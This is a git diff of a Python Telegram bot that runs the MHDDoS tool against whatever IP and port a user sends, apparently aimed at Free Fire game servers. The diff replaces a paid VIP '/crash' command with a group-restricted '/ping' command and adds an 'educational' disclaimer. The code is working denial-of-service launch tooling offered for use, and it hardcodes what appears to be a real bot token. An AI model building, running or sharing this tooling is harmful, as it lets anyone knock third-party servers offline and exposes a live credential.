@@ -1,13 +1,14 @@
 import telebot
 import subprocess
-import sqlite3
-from datetime import datetime, timedelta
 from threading import Lock
 import time
+import atexit
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
-BOT_TOKEN = "TOKEN AQUI"
-ADMIN_ID = 7178876305
+BOT_TOKEN = "7692852873:AAHQ3YtPu90LarVnzyPRd4695zPDKY8taOQ"
+ADMIN_ID = 6348583777
+GROUP_ID = -1002260050481  # Reemplaza con el ID real de tu grupo
+GROUP_LINK = "https://t.me/zFerCrashGoup"  # Reemplaza con el enlace de tu grupo
 START_PY_PATH = "/workspaces/MHDDoS/start.py"
 
 bot = telebot.TeleBot(BOT_TOKEN)
@@ -15,131 +16,53 @@ db_lock = Lock()
 cooldowns = {}
 active_attacks = {}
 
-conn = sqlite3.connect("users.db", check_same_thread=False)
-cursor = conn.cursor()
-cursor.execute(
-    """
-    CREATE TABLE IF NOT EXISTS vip_users (
-        id INTEGER PRIMARY KEY,
-        telegram_id INTEGER UNIQUE,
-        expiration_date TEXT
-    )
-    """
-)
-conn.commit()
+@atexit.register
+def close_db_connection():
+    pass  # No hay conexión de base de datos que cerrar
 
+def is_allowed(message):
+    """ Verifica si el mensaje proviene del grupo permitido o si es del admin en privado. """
+    if message.chat.id == GROUP_ID or (message.chat.type == "private" and message.from_user.id == ADMIN_ID):
+        return True
+    bot.reply_to(message, "❌ Este bot solo funciona en un grupo en específico.\n🔗 Únete a este grupo para poder utilizar este bot: " + GROUP_LINK)
+    return False
 
 @bot.message_handler(commands=["start"])
 def handle_start(message):
-    telegram_id = message.from_user.id
+    if not is_allowed(message):
+        return
 
-    with db_lock:
-        cursor.execute(
-            "SELECT expiration_date FROM vip_users WHERE telegram_id = ?",
-            (telegram_id,),
-        )
-        result = cursor.fetchone()
-
-
-    if result:
-        expiration_date = datetime.strptime(result[0], "%Y-%m-%d %H:%M:%S")
-        if datetime.now() > expiration_date:
-            vip_status = "❌ *Seu plano VIP expirou.*"
-        else:
-            dias_restantes = (expiration_date - datetime.now()).days
-            vip_status = (
-                f"✅ CLIENTE VIP!\n"
-                f"⏳ Dias restantes: {dias_restantes} dia(s)\n"
-                f"📅 Expira en: {expiration_date.strftime('%d/%m/%Y %H:%M:%S')}"
-            )
-    else:
-        vip_status = "❌ *No tienes un plan vip activo.*"
     markup = InlineKeyboardMarkup()
     button = InlineKeyboardButton(
-        text="💻 VENDEDOR - OFICIAL 💻",
+        text="💻 SOPORTE - OFICIAL 💻",
         url=f"tg://user?id={ADMIN_ID}"
-
     )
     markup.add(button)
-    
-    bot.reply_to(
-        message,
-        (
-            "🤖 *BIENVENIDO AL CRASH BOT [Free Fire]!*"
-            
 
-            f"""
-```
-{vip_status}```\n"""
-            "📌 *Como usar:*"
-            """
-```
-/crash <TYPE> <IP/HOST:PORT> <THREADS> <MS>```\n"""
-            "💡 *Ejemplo:*"
-            """
-```
-/crash UDP 143.92.125.230:10013 10 900```\n"""
-            "💠 KrizzZModz 🇵🇪 USERS VIP 💠"
+    bot.send_message(
+        message.chat.id,
+        (
+            "🤖 *Bienvenido al Bot de Ping MHDDoS [Free Fire]!*\n\n"
+            "📌 *Como usar:*\n"
+            "```/ping <TYPE> <IP/HOST:PORT> <THREADS> <MS>```\n\n"
+            "💡 *Ejemplo:*\n"
+            "```/ping UDP 143.92.125.230:10013 3 120```\n\n"
+            "⚠️ *Atención:* Este bot fue creado con fines educativos."
         ),
         reply_markup=markup,
         parse_mode="Markdown",
     )
 
-
-@bot.message_handler(commands=["vip"])
-def handle_addvip(message):
-    if message.from_user.id != ADMIN_ID:
-        bot.reply_to(message, "❌ No eres un vendededor autorizado.")
-        return
-
-    args = message.text.split()
-    if len(args) != 3:
-        bot.reply_to(
-            message,
-            "❌ Formato inválido. Use: `/vip <ID> <QUANTOS DIAS>`",
-            parse_mode="Markdown",
-        )
-        return
-
-    telegram_id = args[1]
-    days = int(args[2])
-    expiration_date = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")
-
-    with db_lock:
-        cursor.execute(
-            """
-            INSERT OR REPLACE INTO vip_users (telegram_id, expiration_date)
-            VALUES (?, ?)
-            """,
-            (telegram_id, expiration_date),
-        )
-        conn.commit()
-
-    bot.reply_to(message, f"✅ Usuário {telegram_id} agregado como VIP por {days} dias.")
-
-
-@bot.message_handler(commands=["crash"])
+@bot.message_handler(commands=["ping"])
 def handle_ping(message):
+    if not is_allowed(message):
+        return
+
     telegram_id = message.from_user.id
 
-    with db_lock:
-        cursor.execute(
-            "SELECT expiration_date FROM vip_users WHERE telegram_id = ?",
-            (telegram_id,),
-        )
-        result = cursor.fetchone()
-
-    if not result:
-        bot.reply_to(message, "❌ No tienes permiso para usar este comando.")
-        return
-
-    expiration_date = datetime.strptime(result[0], "%Y-%m-%d %H:%M:%S")
-    if datetime.now() > expiration_date:
-        bot.reply_to(message, "❌ Su acceso vip Expiró")
-        return
-
-    if telegram_id in cooldowns and time.time() - cooldowns[telegram_id] < 10:
-        bot.reply_to(message, "❌ Espera 10 segundos antes de iniciar otro ataque y recuerda parar el anterior.")
+    # Verificar cooldown
+    if telegram_id in cooldowns and time.time() - cooldowns[telegram_id] < 20:
+        bot.reply_to(message, "❌ Espere 20 segundos antes de usar este comando nuevamente.")
         return
 
     args = message.text.split()
@@ -149,9 +72,9 @@ def handle_ping(message):
             (
                 "❌ *Formato inválido!*\n\n"
                 "📌 *Uso correto:*\n"
-                "`/crash <TYPE> <IP/HOST:PORT> <THREADS> <MS>`\n\n"
+                "`/ping <TYPE> <IP/HOST:PORT> <THREADS> <MS>`\n\n"
                 "💡 *Ejemplo:*\n"
-                "`/crash UDP 143.92.125.230:10013 10 900`"
+                "`/ping UDP 143.92.125.230:10013 3 120`"
             ),
             parse_mode="Markdown",
         )
@@ -163,27 +86,30 @@ def handle_ping(message):
     duration = args[4]
     command = ["python", START_PY_PATH, attack_type, ip_port, threads, duration]
 
-    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    active_attacks[telegram_id] = process
-    cooldowns[telegram_id] = time.time()
+    try:
+        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        active_attacks[telegram_id] = process
+        cooldowns[telegram_id] = time.time()
 
-    markup = InlineKeyboardMarkup()
-    markup.add(InlineKeyboardButton("⛔ Detener Ataque", callback_data=f"stop_{telegram_id}"))
+        markup = InlineKeyboardMarkup()
+        markup.add(InlineKeyboardButton("⛔ Parar Ataque", callback_data=f"stop_{telegram_id}"))
 
-    bot.reply_to(
-        message,
-        (
-            "*[✅] ATAQUE INICIADO - 200 [✅]*\n\n"
-            f"🌐 *Puerto:* {ip_port}\n"
-            f"⚙️ *Tipo:* {attack_type}\n"
-            f"🧟‍♀️ *Threads:* {threads}\n"
-            f"⏳ *Tiempo (ms):* {duration}\n\n"
-            f"💠 KrizzZModz 🇵🇪 USERS VIP 💠"
-        ),
-        reply_markup=markup,
-        parse_mode="Markdown",
-    )
-
+        bot.reply_to(
+            message,
+            (
+                "*[✅] ATAQUE INICIADO - 200 [✅]*\n\n"
+                f"📍 *IP/Host:Porta:* {ip_port}\n"
+                f"⚙️ *Tipo:* {attack_type}\n"
+                f"🧵 *Threads:* {threads}\n"
+                f"⏳ *Tempo (ms):* {duration}\n"
+                f"💻 *Comando ejecutado:* `ping`\n\n"
+                f"*⚠️ Atención! Este bot fue creado por*@xFernandoh"
+            ),
+            reply_markup=markup,
+            parse_mode="Markdown",
+        )
+    except Exception as e:
+        bot.reply_to(message, f"❌ Error al iniciar el ataque: {str(e)}")
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith("stop_"))
 def handle_stop_attack(call):
@@ -191,7 +117,7 @@ def handle_stop_attack(call):
 
     if call.from_user.id != telegram_id:
         bot.answer_callback_query(
-            call.id, "❌ Solo el usuario que inicio el ataque puede pararlo"
+            call.id, "❌ Solo el usuario que inició el ataque puede pararlo."
         )
         return
 
@@ -202,7 +128,7 @@ def handle_stop_attack(call):
 
         bot.answer_callback_query(call.id, "✅ Ataque parado con éxito.")
         bot.edit_message_text(
-            "*[⛔] ATAQUE FINALIZADO[⛔]*",
+            "*[⛔] ATAQUE PARADO [⛔]*",
             chat_id=call.message.chat.id,
             message_id=call.message.id,
             parse_mode="Markdown",
@@ -210,7 +136,7 @@ def handle_stop_attack(call):
         time.sleep(3)
         bot.delete_message(chat_id=call.message.chat.id, message_id=call.message.id)
     else:
-        bot.answer_callback_query(call.id, "❌ No se encontro ningun ataque, siga con su acción.")
+        bot.answer_callback_query(call.id, "❌ Ningún ataque activo.")
 
 if __name__ == "__main__":
     bot.infinity_polling()
